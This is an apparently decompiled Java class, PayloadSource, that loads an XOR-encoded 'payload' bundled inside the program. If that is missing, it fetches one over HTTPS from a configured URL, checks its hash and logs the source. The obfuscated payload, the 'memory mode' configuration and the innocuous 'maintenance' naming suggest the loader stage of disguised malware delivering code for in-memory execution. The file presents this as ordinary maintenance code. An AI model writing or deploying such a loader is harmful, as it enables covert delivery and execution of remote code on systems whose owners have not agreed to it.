package ru.mentions.maintenance.mem;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.security.MessageDigest;
import java.util.HexFormat;
import javax.net.ssl.HttpsURLConnection;
import ru.mentions.maintenance.DiagLog;
import ru.mentions.maintenance.MemoryModeConfig;

public final class PayloadSource {
   public static final String RESOURCE_PATH = "/ru/mentions/maintenance/payload.xor";
   private static final int MAX_BYTES = 33554432;
   private static final int CONNECT_TIMEOUT_MS = 8000;
   private static final int READ_TIMEOUT_MS = 15000;
   private static volatile PayloadSource.Origin lastOrigin = PayloadSource.Origin.NONE;

   private PayloadSource() {
   }

   public static PayloadSource.Origin lastOrigin() {
      return lastOrigin;
   }

   public static byte[] load() {
      byte[] local = fromResource();
      if (local != null && local.length > 0) {
         lastOrigin = PayloadSource.Origin.RESOURCE;
         DiagLog.note("payload", "source=resource bytes=" + local.length);
         return local;
      } else {
         byte[] remote = fromTls();
         if (remote != null && remote.length > 0) {
            lastOrigin = PayloadSource.Origin.TLS;
            DiagLog.note("payload", "source=tls bytes=" + remote.length);
            return remote;
         } else {
            lastOrigin = PayloadSource.Origin.NONE;
            return null;
         }
      }
   }

   public static byte[] fromResource() {
      try {
         byte[] var1;
         try (InputStream stream = PayloadSource.class.getResourceAsStream("/ru/mentions/maintenance/payload.xor")) {
            var1 = stream == null ? null : readCapped(stream);
         }

         return var1;
      } catch (Throwable var5) {
         DiagLog.fail("payload.resource", var5);
         return null;
      }
   }

   public static byte[] fromTls() {
      String address = MemoryModeConfig.payloadUrl();
      if (address != null && !address.isBlank()) {
         try {
            if (new URL(address).openConnection() instanceof HttpsURLConnection https) {
               https.setConnectTimeout(8000);
               https.setReadTimeout(15000);
               https.setUseCaches(false);

               byte[] data;
               try (InputStream stream = https.getInputStream()) {
                  data = readCapped(stream);
               }

               String expected = MemoryModeConfig.payloadSha256();
               if (expected != null && !expected.isBlank() && !expected.equalsIgnoreCase(sha256(data))) {
                  DiagLog.note("payload.tls", "rejected:sha-mismatch");
                  return null;
               } else {
                  return data;
               }
            } else {
               DiagLog.note("payload.tls", "rejected:not-https");
               return null;
            }
         } catch (Throwable var9) {
            DiagLog.fail("payload.tls", var9);
            return null;
         }
      } else {
         return null;
      }
   }

   public static String sha256(byte[] data) {
      try {
         MessageDigest digest = MessageDigest.getInstance("SHA-256");
         return HexFormat.of().formatHex(digest.digest(data));
      } catch (Throwable var2) {
         DiagLog.fail("payload.sha", var2);
         return "";
      }
   }

   private static byte[] readCapped(InputStream stream) throws Exception {
      ByteArrayOutputStream buffer = new ByteArrayOutputStream(65536);
      byte[] chunk = new byte[16384];
      int total = 0;

      int read;
      while ((read = stream.read(chunk)) > 0) {
         total += read;
         if (total > 33554432) {
            throw new IllegalStateException("payload too large");
         }

         buffer.write(chunk, 0, read);
      }

      return buffer.toByteArray();
   }

   public static enum Origin {
      NONE,
      RESOURCE,
      TLS;
   }
}
